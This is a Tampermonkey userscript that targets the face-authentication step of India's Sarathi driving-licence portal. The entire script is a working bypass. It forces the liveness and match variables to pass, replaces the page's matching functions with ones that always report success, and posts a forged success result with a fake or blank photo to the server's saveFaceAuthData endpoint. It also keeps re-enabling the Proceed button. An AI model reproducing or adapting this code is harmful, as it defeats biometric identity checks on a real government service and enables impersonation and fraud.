
// ==UserScript==
// @name         Face Authentication
// @namespace    http://tampermonkey.net/
// @version      2025-07-28
// @description  try to take over the world!
// @author       You
// @match        https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do?authtype=Anugnya
// @match        https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=gov.in
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const waitForValidateSubmit = setInterval(() => {
        if (typeof validateSubmit === 'function') {
            clearInterval(waitForValidateSubmit);
            console.log("✅ Found validateSubmit, hooking into it");

            // Store original function
            const originalValidateSubmit = validateSubmit;

            // Override validateSubmit to inject our code after it's called
            window.validateSubmit = function (...args) {
                const result = originalValidateSubmit.apply(this, args);
                console.log("📥 validateSubmit() was called, waiting 5 seconds...");

                setTimeout(() => {
                    console.log("⏱ 5 seconds passed, running bypass");
                    triggerBypass();
                }, 5000); // 5000ms = 5s

                // Run the bypass logic
                triggerBypass();

                return result;
            };
        }
    }, 300);

    function triggerBypass() {
       console.log("🔓 Enhanced face authentication bypass v2 activated");

    // Wait for all required elements and scripts to load
    const waitForElements = setInterval(() => {
        if (typeof aware !== 'undefined' &&
            document.querySelector('video') &&
            document.getElementById('message')) {

            clearInterval(waitForElements);
            console.log("✅ Required elements found, starting bypass");
            executeBypass();
        }
    }, 500);
    }
    function executeBypass() {
        // 1. Set all success state variables immediately
        window.isGenuine = true;
        window.realFaceCount = 30;
        window.spoofFaceCount = 0;
        window.totalChecks = 40;
        window.smileCounter = 20; // Updated from 5 to 20
        window.blinkCount = 5;
        window.spoofFaceCount = 0;
        window.eyesClosed = 5; // Updated from 0 to 5
        window.matchCount = 1;

        // 2. Create a fake photo from the video
        const video = document.querySelector('video');
        let fakePhoto = null;

        if (video && video.readyState >= 2) {
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth || 300;
            tempCanvas.height = video.videoHeight || 300;
            const tempCtx = tempCanvas.getContext('2d');
            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
            console.log("✅ Created fake photo from video");
        } else {
            // Create a blank canvas as fallback
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = 300;
            tempCanvas.height = 300;
            const tempCtx = tempCanvas.getContext('2d');
            tempCtx.fillStyle = "#ffffff";
            tempCtx.fillRect(0, 0, 300, 300);
            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
            console.log("⚠ Created blank photo as fallback");
        }

        // 3. Directly override the return object with success values
        window.returnObject = {
            isMatch: false,
            message: "Click on Proceed to validate your credentials",
            nextExp: "",
            photo: fakePhoto
        };

        // 4. Override aware.match to immediately resolve with success
        const originalMatch = window.aware.match;
        window.aware.match = function() {
            console.log("🔄 Intercepted aware.match with direct success response");

            // Create a successful result object
            const result = {
                isMatch: false,
                message: "Click on Proceed to validate your credentials",
                nextExp: "",
                photo: fakePhoto
            };

            // Update UI immediately
            if (window.messageToShown) {
                window.messageToShown.innerHTML = result.message;
            }

            // Enable the proceed button
            if (document.getElementById('capphto1')) {
                document.getElementById('capphto1').disabled = false;
            }

            // Disable other elements
            if (document.getElementById('capphto')) {
                document.getElementById('capphto').disabled = true;
            }
            if (document.getElementById('llappln')) {
                document.getElementById('llappln').disabled = true;
            }
            if (document.getElementById('pwd')) {
                document.getElementById('pwd').disabled = true;
            }

            // Send success data to server
            const llappln = document.getElementById('llappln')?.value || '';
            const rtocode = document.getElementById('rtocode')?.value || '';

            try {
                $.ajax({
                    type: 'POST',
                    url: 'saveFaceAuthData.do',
                    data: {
                        applno: llappln,
                        rtocode: rtocode,
                        faceres: 1,  // 1 means success
                        CapPho: fakePhoto
                    },
                    dataType: 'json',
                    success: function(data) {
                        console.log("✅ Server accepted the authentication data");
                    },
                    error: function() {
                        console.log("⚠ Server error, but UI still shows success");
                    }
                });
            } catch (err) {
                console.log("⚠ Error sending data: " + err.message);
            }

            // Return the successful result
            return Promise.resolve(result);
        };

        // 5. Override insertfeceauth to always succeed
        window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
            console.log("🔄 Intercepted insertfeceauth with forced success");

            // Always use true for face result
            faceresult = true;

            // Get application number and RTO code if not provided
            llappln = llappln || document.getElementById('llappln')?.value || '';
            rtocode = rtocode || document.getElementById('rtocode')?.value || '';
            result_photo = result_photo || fakePhoto;

            // Enable/disable appropriate buttons
            if (document.getElementById('capphto1')) {
                document.getElementById('capphto1').disabled = false;
            }
            if (document.getElementById('capphto')) {
                document.getElementById('capphto').disabled = true;
            }
            if (document.getElementById('llappln')) {
                document.getElementById('llappln').disabled = true;
            }
            if (document.getElementById('pwd')) {
                document.getElementById('pwd').disabled = true;
            }

            // Send the success data to server
            try {
                $.ajax({
                    type: 'POST',
                    url: 'saveFaceAuthData.do',
                    data: {
                        applno: llappln,
                        rtocode: rtocode,
                        faceres: 1,  // 1 means success
                        CapPho: result_photo
                    },
                    dataType: 'json',
                    success: function(data) {
                        console.log("✅ Server accepted the authentication data");
                    },
                    error: function() {
                        console.log("⚠ Server error, but UI still shows success");
                    }
                });
            } catch (err) {
                console.log("⚠ Error sending data: " + err.message);
            }

            return true;
        };

        // 6. Directly trigger the authentication flow
        console.log("🚀 Directly triggering authentication success");

        // Update UI to show final success message
        if (document.getElementById('message')) {
            document.getElementById('message').innerHTML = "Click on Proceed to validate your credentials";
        }

        // Find and enable the proceed button
        if (document.getElementById('capphto1')) {
            document.getElementById('capphto1').disabled = false;
        }

        // Directly call match to trigger the success flow
        window.aware.match().then(result => {
            console.log("✅ Match completed with result:", result);

            const proceedBtn = document.getElementById('capphto1');

            if (proceedBtn) {
                proceedBtn.disabled = false;
                console.log("✅ Proceed button initially enabled");

                // Watch the button every second
                const watchProceed = setInterval(() => {
                    if (proceedBtn.disabled) {
                        console.log("🔁 Proceed button was disabled — re-enabling now");
                        proceedBtn.disabled = false;
                    }
                }, 1000); // check every second
            }
        });
    }
})();
